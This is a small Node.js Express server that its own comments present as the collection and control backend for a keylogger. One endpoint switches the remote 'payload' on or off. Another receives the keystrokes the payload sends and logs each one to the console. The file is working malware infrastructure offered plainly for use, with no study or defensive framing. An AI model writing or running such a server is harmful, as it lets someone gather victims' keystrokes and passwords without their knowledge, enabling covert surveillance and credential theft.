const express = require('express');
const bodyParser = require('body-parser');

const app = express();
const port = 3000; // Change this to your desired port
var startstop = true;

app.use(bodyParser.json());

// This is a simple input so that we can control whether or not the payload should be active.
app.post('/command', (req, res) => {
    const { command } = req.body;
    if(command === 'Start' || command === 'start' || command === 'true' || command === 'T')
    {
        console.log(" command: " + command);
        startstop = true;
        res.status(200).json({ response: 1 });
    }
    else{
        console.log("command: Stop");
        startstop = false;
        res.status(200).json({ response: 0});
    }
    
});

// Here we will capture all the keyboard data send from payload
app.post('/post_data', (req, res) => {
    const { key } = req.body;
    if(startstop) {
        res.status(200).send(200);
        console.log("Success")
        console.log(key)
    }
    else {
        res.status(400).send(400);
    }
});

app.get('/', (req, res) => {
    res.send('<p>Success</p>');
});


app.listen(port, () => {
    console.log(`Server running at http://localhost:${port}`);
});
